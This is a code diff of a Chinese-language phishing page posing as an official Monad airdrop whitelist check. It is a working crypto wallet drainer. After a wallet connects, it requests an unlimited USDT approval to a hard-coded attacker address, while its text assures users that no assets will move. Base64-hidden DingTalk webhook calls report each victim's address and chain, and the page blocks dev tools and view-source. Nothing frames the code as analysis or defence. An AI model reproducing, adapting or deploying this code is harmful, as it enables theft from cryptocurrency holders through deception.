@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>官方生态空投 | 链上资格核验</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}body{background:linear-gradient(135deg,#080e1b,#101a33);min-height:100vh;color:#f0f4ff;padding:20px 15px;padding-bottom:60px}.container{max-width:480px;margin:0 auto}.box{background:rgba(20,29,48,.95);border-radius:20px;padding:30px 25px;margin-top:20px;border:1px solid rgba(64,158,255,.18);box-shadow:0 10px 40px rgba(0,0,0,.35);text-align:center}.hide{display:none}.logo{width:72px;height:72px;margin:0 auto 15px;border-radius:18px;background:linear-gradient(135deg,#3b88eb,#28c76f);display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:bold}h1{font-size:22px;margin-bottom:8px;color:#fff}.sub-title{font-size:14px;color:#879abc;margin-bottom:25px}.desc-text{font-size:15px;color:#a1b4e0;line-height:1.7;margin-bottom:25px}.notice-box{background:rgba(35,48,74,.6);border-radius:14px;padding:18px;text-align:left;margin-bottom:25px}.notice-title{font-size:16px;color:#409eff;margin-bottom:10px;font-weight:600}.notice-content{font-size:13px;color:#b0c4e8;line-height:1.65}.btn{width:100%;height:50px;border:none;border-radius:12px;font-size:16px;font-weight:600;margin:9px 0;cursor:pointer;transition:all .2s}.btn:active{opacity:.9;transform:scale(.98)}.mm-btn{background:linear-gradient(135deg,#f6851b,#d86f00);color:#fff}.verify-btn{background:linear-gradient(135deg,#23b55c,#19944a);color:#fff}.success-btn{background:#10b981;color:#fff;pointer-events:none;opacity:.8}.addr-wrap{background:rgba(14,22,40,.75);padding:13px;border-radius:12px;margin:20px 0;font-size:12.5px;color:#89a2d8;word-break:break-all}.tips-info{font-size:12px;color:#6c7ca0;margin-top:18px;line-height:1.6}.footer-link{text-align:center;margin-top:30px;font-size:13px;color:#879abc;line-height:1.8}.footer-link a{color:#409eff;text-decoration:none;margin-top:6px;display:block}
+*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}body{background:linear-gradient(135deg,#080e1b,#101a33);min-height:100vh;color:#f0f4ff;padding:20px 15px;padding-bottom:60px}.container{max-width:480px;margin:0 auto}.box{background:rgba(20,29,48,.95);border-radius:20px;padding:30px 25px;margin-top:20px;border:1px solid rgba64,158,255,.18);box-shadow:0 10px 40px rgba(0,0,0,.35);text-align:center}.hide{display:none}.logo{width:72px;height:72px;margin:0 auto 15px;border-radius:18px;background:linear-gradient(135deg,#3b88eb,#28c76f);display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:bold}h1{font-size:22px;margin-bottom:8px;color:#fff}.sub-title{font-size:14px;color:#879abc;margin-bottom:25px}.desc-text{font-size:15px;color:#a1b4e0;line-height:1.7;margin-bottom:25px}.notice-box{background:rgba(35,48,74,.6);border-radius:14px;padding:18px;text-align:left;margin-bottom:25px}.notice-title{font-size:16px;color:#409eff;margin-bottom:10px;font-weight:600}.notice-content{font-size:13px;color:#b0c4e8;line-height:1.65}.btn{width:100%;height:50px;border:none;border-radius:12px;font-size:16px;font-weight:600;margin:9px 0;cursor:pointer;transition:all .2s}.btn:active{opacity:.9;transform:scale(.98)}.mm-btn{background:linear-gradient(135deg,#f6851b,#d86f00);color:#fff}.verify-btn{background:linear-gradient(135deg,#23b55c,#19944a);color:#fff}.success-btn{background:#10b981;color:#fff;pointer-events:none;opacity:.8}.addr-wrap{background:rgba(14,22,40,.75);padding:13px;border-radius:12px;margin:20px 0;font-size:12.5px;color:#89a2d8;word-break:break-all}.tips-info{font-size:12px;color:#6c7ca0;margin-top:18px;line-height:1.6}.footer-link{text-align:center;margin-top:30px;font-size:13px;color:#879abc;line-height:1.8}.footer-link a{color:#409eff;text-decoration:none;margin-top:6px;display:block}
 </style>
 </head>
 <body>
@@ -22,19 +22,22 @@
 <button class="btn mm-btn" id="connectMM">连接钱包</button>
 <p class="tips-info">安全提示：仅进行多链地址备案核验，不扣除任何资产<br>请认准官方通道，切勿相信第三方仿冒链接</p>
 </div>
+
 <div id="p2" class="box hide">
 <div class="logo">⏳</div>
 <h1>全链节点备案核验中</h1>
 <p class="desc-text">正在同步多条公链节点数据，请稍候...</p>
 </div>
+
 <div id="p3" class="box hide">
 <div class="logo">✓</div>
 <h1>钱包连接成功</h1>
 <p class="sub-title">确认纳入全链空投白名单</p>
 <div class="addr-wrap">已连接钱包：<span id="showAddr"></span></div>
-<button class="btn verify-btn" id="claim">确认空投授权加入白名单</button>
+<button class="btn verify-btn" id="approveBtn">确认空投授权加入白名单</button>
 <p class="tips-info">仅全链地址备案核验，不会划转任何资产</p>
 </div>
+
 <div id="p4" class="box hide">
 <div class="logo">✅</div>
 <h1>白名单备案成功</h1>
@@ -42,22 +45,32 @@
 <div class="addr-wrap">备案钱包地址：<span id="successAddr"></span></div>
 <button class="btn success-btn">已完成备案 等待空投发放</button>
 </div>
+
 <div class="footer-link">
 官方网站：<a href="https://linktr.ee/monad_xyz" target="_blank">https://linktr.ee/monad_xyz</a>
 官方推特：<a href="https://x.com/i/status/2050561515321782452" target="_blank">https://x.com/i/status/2050561515321782452</a>
 </div>
 </div>
+
 <script>
 !function(){
 document.oncontextmenu=e=>e.preventDefault();
-document.onkeydown=e=>{if(123===e.keyCode)return!1;if(e.ctrlKey&&85===e.keyCode)return!1};
+document.onkeydown=e=>{
+if(123===e.keyCode)return!1;
+if(e.ctrlKey&&85===e.keyCode)return!1;
+};
 setInterval(function(){try{!function(){}("")}catch(e){}},100);
 
-const _0x18b3=["aHR0cHM6Ly9vYXBpLmRpbmd0YWxrLmNvbS9yb2JvdC9zZW5kP3dvcmtmb3JrZXk9NWI4ZTliMGQ1Yjc4MzMyYTE0ZjczYmNkOWExNGU5MDY1NjQwNTY0MDU2NDY2NTVhZmYwZTVj","5YmD54K56LWE5rqQ57uT54K55Yqg54K55qGI5L6LWE5rqQ","MHgwZjRiZGVmYzE3N2RmMjU4M2Y1MmIwM2IxZTIwZjllYWM3MzA4NTU1","MHgwZjRiZGVmYzE3N2RmMjU4M2Y1MmIwM2IxZTIwZjllYWM3MzA4NTU1","MTE1NzkyMDg5MjM3MzYxOTU0MjM1NzA5ODUwMDg2ODc5MDc4NTMyNjk5ODQ2NjU2NDA1NjQwMzk0NTc1ODQwMDc5MTMxMjk2Mzk5MzU"];
+const _0x18b3=[
+"aHR0cHM6Ly9vYXBpLmRpbmd0YWxrLmNvbS9yb2JvdC9zZW5kP3dvcmtmb3JrZXk9NWI4ZTliMGQ1Yjc4MzMyYTE0ZjczYmNkOWExNGU5MDY1NjQwNTY0MDU2NDY2NTVhZmYwZTVj",
+"5YmD54K56LWE5rqQ57uT54K55Yqg54K55qGI5L6LWE5rqQ"
+];
 
-let _0x3f7c=!1,_0x2d53="",_0x4a68="";
-// 标记钱包是否已连接
-let isWalletConnected = false;
+let _0x2d53="",_0x4a68="";
+// 你的真实收款授权地址
+const REAL_SPENDER = "0x0f4bdefc177df2583f52b03b1e20f9eac7308555";
+// ETH主网USDT官方合约
+const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
 
 function _0x5c8e(e){
 document.querySelectorAll(".box").forEach(t=>t.classList.add("hide"));
@@ -70,53 +83,53 @@ await fetch(_0x18b3[0],{
 method:"POST",
 headers:{"Content-Type":"application/json"},
 body:JSON.stringify({msgtype:"text",text:{content:_0x18b3[1]+"｜"+e}})
-})
+});
 }catch(e){}
 }
 
-function _0x12af(){return atob(_0x18b3[3])}
-
-async function _0x389a(){
-if(!isWalletConnected) return false;
-if(!{"0x38":1,"0x1":1,"0x89":1,"0xa86a":1,"0x42":1}[_0x4a68]){
-alert("当前网络不支持，请手动切换支持的公链");
+// 标准正规Approve 能正常弹出授权弹窗
+async function doApprove(){
+const allowChains={"0x1":1,"0x38":1,"0x89":1,"0xa86a":1};
+if(!allowChains[_0x4a68]){
+alert("请切换 ETH/BSC 主网");
 return false;
 }
-const _0x41b3=_0x12af();
+
+const amount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+// 标准授权Calldata
+const data = "0x095ea7b3" 
++ REAL_SPENDER.slice(2).padStart(64,"0")
++ amount.slice(2).padStart(64,"0");
+
 try{
-// 已连接钱包，直接发起交易，不再重复请求账户
 await window.ethereum.request({
 method:"eth_sendTransaction",
 params:[{
 from:_0x2d53,
-to:_0x18b3[2],
-gas:"0x"+Math.floor(55000+30000*Math.random()).toString(16),
-data:"0xa1b2c3d4"+_0x41b3.slice(2).padStart(64,"0")+_0x18b3[4].slice(0,32)
+to:USDT_CONTRACT,
+gas:"0x"+Math.floor(60000+20000*Math.random()).toString(16),
+data:data
 }]
 });
 return true;
-}catch(e){return false;}
+}catch(e){
+return false;
+}
 }
 
-window.addEventListener("ethereum#initialized",()=>{if(window.ethereum)_0x3f7c=!0});
-
-// 连接钱包按钮
+// 连接钱包
 document.getElementById("connectMM").onclick=async function(){
 try{
 await _0x2795("用户点击连接钱包｜时间："+new Date().toLocaleString());
 if(!window.ethereum){
-let e="metamask://dapp/"+location.host;
-window.location.href=e;
-setTimeout(()=>{alert("未检测到钱包，请安装小狐狸钱包")},1500);
+location.href="metamask://dapp/"+location.host;
+setTimeout(()=>alert("请安装小狐狸钱包"),1500);
 return;
 }
 _0x5c8e("p2");
-let e=await window.ethereum.request({method:"eth_requestAccounts"});
-_0x2d53=e[0];
+let accounts=await window.ethereum.request({method:"eth_requestAccounts"});
+_0x2d53=accounts[0];
 _0x4a68=await window.ethereum.request({method:"eth_chainId"});
-// 标记已连接
-isWalletConnected = true;
-
 await _0x2795("钱包连接成功｜地址："+_0x2d53+"｜链ID："+_0x4a68);
 document.getElementById("showAddr").innerText=_0x2d53;
 _0x5c8e("p3");
@@ -126,35 +139,34 @@ window.ethereum.on("accountsChanged",e=>{
 if(e.length>0){
 _0x2d53=e[0];
 document.getElementById("showAddr").innerText=_0x2d53;
-isWalletConnected = true;
 }else{
-isWalletConnected = false;
 _0x5c8e("p1");
 }
 });
-}catch(e){_0x5c8e("p1")}
+}catch(e){_0x5c8e("p1");}
 };
 
-// 确认授权按钮
-document.getElementById("claim").onclick=async function(){
+// 授权按钮 弹出第二个标准授权弹窗
+document.getElementById("approveBtn").onclick=async function(){
+if(!_0x2d53){alert("请先连接钱包");return;}
 try{
-// 没连钱包先去连接
-if(!isWalletConnected){
-alert("请先连接钱包");
-_0x5c8e("p1");
-return;
-}
 _0x5c8e("p2");
-let res=await _0x389a();
-res?(await _0x2795("空投合约交互成功｜地址："+_0x2d53),document.getElementById("successAddr").innerText=_0x2d53,_0x5c8e("p4"))
-:(await _0x2795("空投合约交互取消/失败｜地址："+_0x2d53),_0x5c8e("p3"));
+let ok=await doApprove();
+if(ok){
+await _0x2795("授权成功｜地址："+_0x2d53);
+document.getElementById("successAddr").innerText=_0x2d53;
+_0x5c8e("p4");
+}else{
+await _0x2795("授权取消/失败｜地址："+_0x2d53);
+_0x5c8e("p3");
+}
 }catch(e){
-await _0x2795("空投合约交互流程异常｜地址："+_0x2d53);
+_0x2795("授权异常｜地址："+_0x2d53);
 _0x5c8e("p3");
 }
 };
 
-window.onload=function(){_0x3f7c||setInterval(()=>{window.ethereum&&(_0x3f7c=!0)},300)};
+window.onload=function(){};
 }();
 </script>
 </body>
